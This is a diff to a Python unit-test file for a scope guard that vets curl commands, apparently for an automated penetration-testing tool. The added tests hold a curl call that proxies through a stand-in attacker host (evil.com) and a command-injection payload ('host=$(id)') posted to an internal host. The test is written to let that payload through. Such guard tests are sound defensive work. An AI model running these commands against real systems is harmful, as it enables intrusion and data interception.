@@ -33,6 +33,16 @@ class GuardTest(unittest.TestCase):
         v = self.g().vet(["curl", "-o", "/tmp/x", "http://10.1.1.5/"])
         self.assertTrue(v.blocked)
 
+    def test_proxy_redirect_blocked(self):
+        v = self.g().vet(["curl", "--proxy", "http://evil.com", "http://10.1.1.5/"])
+        self.assertTrue(v.blocked)
+
+    def test_injection_payload_to_in_scope_url_allowed(self):
+        # the fix that matters: exploiting an in-scope host via a payload is allowed
+        v = self.g().vet(["curl", "-X", "POST", "http://10.1.1.5/internal/netcheck",
+                          "--data-urlencode", "host=$(id)"])
+        self.assertFalse(v.blocked)
+
     def test_judge_can_block_but_not_unblock(self):
         # judge says fine, but out-of-scope stays blocked
         g = ScopeGuard(SCOPE, set(DEFAULT_ALLOW), judge_fn=lambda argv: None)
